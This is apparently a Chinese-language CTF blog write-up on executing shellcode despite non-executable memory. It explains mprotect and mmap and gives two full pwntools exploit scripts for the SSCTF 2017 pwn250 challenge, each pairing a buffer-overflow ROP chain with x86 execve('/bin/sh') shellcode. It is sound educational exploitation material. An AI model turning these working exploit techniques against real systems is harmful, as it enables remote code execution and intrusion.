---
title: execute shellcode with mmap and mprotect
date: 2017-05-07 23:25:37
categories: pwn
---

# 利用mmap和mprotect来任意执行shellcode
此前一直只了解了下原理，没有实际执行过，结果遇到题目后花时间去查它们的详细参数，因此这里记录总结下。

<!-- more -->
> - by hook

## 信息介绍

现在程序基本都是开了对堆栈不可执行选项，但msf一堆优秀的shellcode不能拿来用是件多么痛苦的事情。
这里可以用mmap()或者mprotect函数来构造出我们须要权限的segment。

## 函数介绍
### <1>. mprotect
int mprotect(const void *start, size_t len, int prot);  
mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

### <2>. mmap
void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);
mmap()函数把指定或随机分配的地址内存，以prot权限映射到自start开始的，长度为length，而且为PAGE_SIZE单位的地址。

## 利用思路
<1>. 将shellcode写进一段具有可写权限的段里，然后用mprotect将对应的段修改为可执行，再跳到布置好的shellcode里。
<2>. 用mmap获取一段rwx权限的内存，映射到指定地址处，然后将shellcode写入映射好的内容存里，接着跳入布置好的shellcode中。

## 实例
[ssctf-2017 pwn250](https://github.com/gloxec/record/ssctf_2017/pwn250)
就拿这这个来练习下mprotect&mmap:

mprotect:

```
#!/usr/bin/python

from pwn import *

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

bssAddr = 0x080ec000
mprotectAddr = 0x0806e070
readAddr = 0x0806d510

p = process('./250')
#p = remote('60.191.205.81', 2017)
context.log_level = 'debug'
p.recvuntil('Size]')
p.sendline('102')
p.recvuntil('Data]')

pppr = 0x080ad715

payload = 'a'*62+p32(mprotectAddr) + p32(pppr) + p32(bssAddr) + p32(0x1000) + p32(7)
payload += p32(readAddr) + p32(bssAddr) + p32(0) + p32(bssAddr) + p32(len(shellcode)+1)
p.send(payload)
p.send(shellcode)
p.recv()

p.interactive()
```

mmap:

```
#!/usr/bin/python

from pwn import *

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

segAddr = 0xbeef0000
mmapAddr = 0x0806DF70 
mainAddr = 0x08048886
readAddr = 0x0806d510

p = process('./250')
#p = remote('60.191.205.81', 2017)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p.recvuntil('Size]')
p.sendline('94')
p.recvuntil('Data]')

payload = 'a'*62+p32(mmapAddr) + p32(mainAddr) + p32(segAddr) + p32(1024) + p32(7) + p32(34) + p32(0) + p32(0)
p.send(payload)

p.recvuntil('Size]')
#gdb.attach(p)
p.sendline('82')
p.recvuntil('Data]')
payload2 = 'a'*62+p32(readAddr) + p32(segAddr) + p32(0) + p32(segAddr) + p32(1024)
p.send(payload2)
p.sendline(shellcode)
p.recv()

p.interactive()
```
这里拿mmap后的内存看一下,可以发现被映射成rwx的内存和shellcode的成功执行。
![](/images/execute shellcode with mmap and mprotect/mmap.png)

